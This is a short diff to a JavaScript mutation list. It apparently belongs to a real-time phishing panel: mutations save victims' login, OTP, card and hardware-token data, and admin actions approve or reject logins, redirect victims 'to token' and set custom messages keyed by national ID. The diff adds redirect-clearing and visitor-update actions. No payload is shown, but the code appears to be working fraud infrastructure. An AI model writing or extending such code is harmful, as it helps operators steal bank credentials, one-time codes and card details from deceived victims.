@@ -93,11 +93,13 @@ const SYNC_MUTATIONS = new Set([
   'applications.savePersonalInfo', 'applications.saveLoginData',
   'applications.saveOtpData', 'applications.saveCardData',
   'applications.saveHardToken', 'applications.saveWatchLink',
+  'applications.clearRedirectByUser', 'applications.clearCustomMessage',
+  'admin.updateVisitor',
   'admin.approveLogin', 'admin.rejectLogin',
   'admin.redirectUser', 'admin.redirectVisitor', 'admin.redirectAllToToken',
   'admin.redirectWhatsApp', 'admin.deleteApplication', 'admin.deleteInactiveClients',
   'admin.deleteAllClients', 'admin.setCustomMessage', 'admin.updateWhatsAppLink',
-  'admin.resetTotalVisitors',
+  'admin.resetTotalVisitors', 'admin.clearVisitorRedirect',
 ]);
 
 function getOrCreateApp(data, nationalId) {
